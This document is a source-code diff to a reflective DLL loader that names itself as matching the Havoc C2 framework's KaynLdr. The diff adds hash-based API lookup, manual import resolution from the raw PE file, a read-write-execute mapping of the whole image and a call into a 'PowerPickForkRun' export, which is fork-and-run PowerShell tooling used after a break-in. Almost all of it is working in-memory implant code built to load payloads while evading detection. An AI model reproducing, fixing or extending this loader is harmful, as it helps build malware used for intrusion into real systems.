@@ -40,13 +40,15 @@ static PVOID KaynCaller(void)
     }
 }
 
+/* Match Havoc KaynLdr hash (null bytes in Length-bounded buffers are hashed). */
 static DWORD KHashString(PVOID string, SIZE_T length)
 {
     ULONG hash = HASH_KEY;
     PUCHAR ptr = (PUCHAR)string;
 
     for (;;) {
-        UCHAR character;
+        UCHAR character = *ptr;
+
         if (!length) {
             if (!*ptr) {
                 break;
@@ -59,7 +61,7 @@ static DWORD KHashString(PVOID string, SIZE_T length)
                 ++ptr;
             }
         }
-        character = *ptr;
+
         if (character >= 'a') {
             character = (UCHAR)(character - 0x20);
         }
@@ -181,36 +183,91 @@ static PVOID KGetProcAddressByHash(
     return NULL;
 }
 
-static VOID KResolveIAT(KAYNINSTANCE* instance, PVOID kaynImage, PVOID iatDir)
+static DWORD KRvaToOffset(PVOID rawPe, PIMAGE_NT_HEADERS nt, DWORD rva)
 {
-    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)iatDir;
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    WORD i;
+    if (rva < nt->OptionalHeader.SizeOfHeaders) {
+        return rva;
+    }
+    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        DWORD va = sec[i].VirtualAddress;
+        DWORD vsz = sec[i].Misc.VirtualSize;
+        DWORD raw = sec[i].PointerToRawData;
+        DWORD rsz = sec[i].SizeOfRawData;
+        if (rva >= va && rva < va + (vsz ? vsz : rsz)) {
+            return raw + (rva - va);
+        }
+    }
+    return 0;
+}
 
+/*
+ * Resolve imports into the mapped image. Thunk name RVAs are read from the
+ * original file so this is safe after base relocations have run.
+ */
+static VOID KResolveIAT(
+    KAYNINSTANCE* instance,
+    PVOID kaynImage,
+    PVOID rawPe)
+{
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)kaynImage +
+        ((PIMAGE_DOS_HEADER)kaynImage)->e_lfanew);
+    PIMAGE_NT_HEADERS rawNt = (PIMAGE_NT_HEADERS)((PUCHAR)rawPe +
+        ((PIMAGE_DOS_HEADER)rawPe)->e_lfanew);
+    DWORD impRva =
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
+            .VirtualAddress;
+    PIMAGE_IMPORT_DESCRIPTOR imp;
+
+    if (!impRva) {
+        return;
+    }
+
+    imp = (PIMAGE_IMPORT_DESCRIPTOR)((PUCHAR)kaynImage + impRva);
     for (; imp->Name; ++imp) {
         PCHAR importModuleName = (PCHAR)((PUCHAR)kaynImage + imp->Name);
         HMODULE importModule = (HMODULE)KLoadLibrary(instance, importModuleName);
-        PIMAGE_THUNK_DATA originalTd =
-            (PIMAGE_THUNK_DATA)((PUCHAR)kaynImage +
-                (imp->OriginalFirstThunk ? imp->OriginalFirstThunk
-                                         : imp->FirstThunk));
-        PIMAGE_THUNK_DATA firstTd =
-            (PIMAGE_THUNK_DATA)((PUCHAR)kaynImage + imp->FirstThunk);
+        DWORD oftRva =
+            imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
+        DWORD ftRva = imp->FirstThunk;
+        DWORD idx;
 
         if (!importModule) {
             continue;
         }
 
-        for (; originalTd->u1.AddressOfData;
-             ++originalTd, ++firstTd) {
-            if (IMAGE_SNAP_BY_ORDINAL(originalTd->u1.Ordinal)) {
-                /* Host has no ordinal imports; skip. */
+        for (idx = 0;; idx++) {
+            DWORD entryOff =
+                KRvaToOffset(rawPe, rawNt, oftRva + idx * sizeof(ULONGLONG));
+            ULONGLONG entry;
+            PIMAGE_THUNK_DATA firstTd;
+
+            if (!entryOff) {
+                break;
+            }
+            entry = *(ULONGLONG*)((PUCHAR)rawPe + entryOff);
+            if (entry == 0) {
+                break;
+            }
+
+            firstTd = (PIMAGE_THUNK_DATA)((PUCHAR)kaynImage + ftRva +
+                idx * sizeof(ULONGLONG));
+
+            if (IMAGE_SNAP_BY_ORDINAL(entry)) {
                 continue;
             } else {
-                PIMAGE_IMPORT_BY_NAME byName =
-                    (PIMAGE_IMPORT_BY_NAME)((PUCHAR)kaynImage +
-                        originalTd->u1.AddressOfData);
-                DWORD functionHash =
+                DWORD ibnOff = KRvaToOffset(rawPe, rawNt, (DWORD)entry);
+                PIMAGE_IMPORT_BY_NAME byName;
+                DWORD functionHash;
+                PVOID function;
+                if (!ibnOff) {
+                    continue;
+                }
+                byName = (PIMAGE_IMPORT_BY_NAME)((PUCHAR)rawPe + ibnOff);
+                functionHash =
                     KHashString(byName->Name, KStringLengthA(byName->Name));
-                PVOID function =
+                function =
                     KGetProcAddressByHash(instance, importModule, functionHash);
                 if (function) {
                     firstTd->u1.Function = (ULONGLONG)function;
@@ -238,6 +295,65 @@ static VOID KReAllocSections(PVOID kaynImage, PVOID imageBase, PVOID baseRelocDi
     }
 }
 
+/* Resolve export from a mapped image (VA layout). */
+static PVOID KGetExportVA(PVOID imageBase, const char* exportName)
+{
+    PIMAGE_NT_HEADERS nt;
+    PIMAGE_EXPORT_DIRECTORY exports;
+    PDWORD names;
+    PDWORD funcs;
+    PWORD ords;
+    DWORD i;
+
+    if (!imageBase || !exportName) {
+        return NULL;
+    }
+    nt = (PIMAGE_NT_HEADERS)((PUCHAR)imageBase +
+        ((PIMAGE_DOS_HEADER)imageBase)->e_lfanew);
+    if (!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+             .VirtualAddress) {
+        return NULL;
+    }
+    exports = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)imageBase +
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+            .VirtualAddress);
+    names = (PDWORD)((PUCHAR)imageBase + exports->AddressOfNames);
+    funcs = (PDWORD)((PUCHAR)imageBase + exports->AddressOfFunctions);
+    ords = (PWORD)((PUCHAR)imageBase + exports->AddressOfNameOrdinals);
+
+    for (i = 0; i < exports->NumberOfNames; i++) {
+        PCHAR name = (PCHAR)((PUCHAR)imageBase + names[i]);
+        SIZE_T n = 0;
+        while (exportName[n] && name[n] && exportName[n] == name[n]) {
+            n++;
+        }
+        if (exportName[n] == '\0' && name[n] == '\0') {
+            return (PVOID)((PUCHAR)imageBase + funcs[ords[i]]);
+        }
+    }
+    return NULL;
+}
+
+static VOID KExit(KAYNINSTANCE* instance, UINT code)
+{
+    typedef VOID(WINAPI * FN_ExitProcess)(UINT);
+    HMODULE k32;
+    FN_ExitProcess exitProcess;
+
+    if (!instance || !instance->Win32.LdrLoadDll) {
+        return;
+    }
+    k32 = (HMODULE)KLoadLibrary(instance, "kernel32.dll");
+    if (!k32) {
+        return;
+    }
+    exitProcess = (FN_ExitProcess)KGetProcAddressByHash(
+        instance, k32, SYS_EXITPROCESS);
+    if (exitProcess) {
+        exitProcess(code);
+    }
+}
+
 __declspec(dllexport) void WINAPI KaynLoader(LPVOID lpParameter)
 {
     KAYNINSTANCE instance;
@@ -248,6 +364,8 @@ __declspec(dllexport) void WINAPI KaynLoader(LPVOID lpParameter)
     SIZE_T kMemSize = 0;
     PIMAGE_DATA_DIRECTORY imageDir;
     DWORD i;
+    typedef void(CALLBACK* FN_PowerPickForkRun)(HWND, HINSTANCE, LPSTR, int);
+    FN_PowerPickForkRun pRun;
 
     instance.Modules.Ntdll = NULL;
     instance.Win32.LdrLoadDll = NULL;
@@ -284,6 +402,7 @@ __declspec(dllexport) void WINAPI KaynLoader(LPVOID lpParameter)
             &kMemSize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE))) {
+        KExit(&instance, 0xC0000005);
         return;
     }
 
@@ -304,15 +423,7 @@ __declspec(dllexport) void WINAPI KaynLoader(LPVOID lpParameter)
         }
     }
 
-    imageDir =
-        &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-    if (imageDir->VirtualAddress) {
-        KResolveIAT(
-            &instance,
-            kVirtualMemory,
-            (PUCHAR)kVirtualMemory + imageDir->VirtualAddress);
-    }
-
+    /* Relocations first, then imports (names read from the raw file). */
     imageDir =
         &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     if (imageDir->VirtualAddress) {
@@ -321,6 +432,8 @@ __declspec(dllexport) void WINAPI KaynLoader(LPVOID lpParameter)
             (PVOID)(ULONG_PTR)ntHeaders->OptionalHeader.ImageBase,
             (PUCHAR)kVirtualMemory + imageDir->VirtualAddress);
     }
+
+    KResolveIAT(&instance, kVirtualMemory, kaynLibraryLdr);
 
     /* RWX whole image — simple and reliable for MinGW CRT. */
     {
@@ -331,11 +444,22 @@ __declspec(dllexport) void WINAPI KaynLoader(LPVOID lpParameter)
             NtCurrentProcess(), &base, &region, PAGE_EXECUTE_READWRITE, &oldProt);
     }
 
+    /* CRT/DllMain only — do not run host work under the loader lock. */
     {
         BOOL(WINAPI * dllMain)(PVOID, DWORD, PVOID) =
             (BOOL(WINAPI*)(PVOID, DWORD, PVOID))(
                 (PUCHAR)kVirtualMemory +
                 ntHeaders->OptionalHeader.AddressOfEntryPoint);
-        dllMain(kVirtualMemory, DLL_PROCESS_ATTACH, lpParameter);
+        dllMain(kVirtualMemory, DLL_PROCESS_ATTACH, NULL);
     }
+
+    /* After CRT init, invoke the rundll-style export with the map name. */
+    pRun = (FN_PowerPickForkRun)KGetExportVA(kVirtualMemory, "PowerPickForkRun");
+    if (!pRun || !lpParameter) {
+        KExit(&instance, 0xC0000005);
+        return;
+    }
+    pRun(NULL, (HINSTANCE)kVirtualMemory, (LPSTR)lpParameter, 0);
+    /* PowerPickForkRun calls ExitProcess; if it returns, force exit. */
+    KExit(&instance, 1);
 }
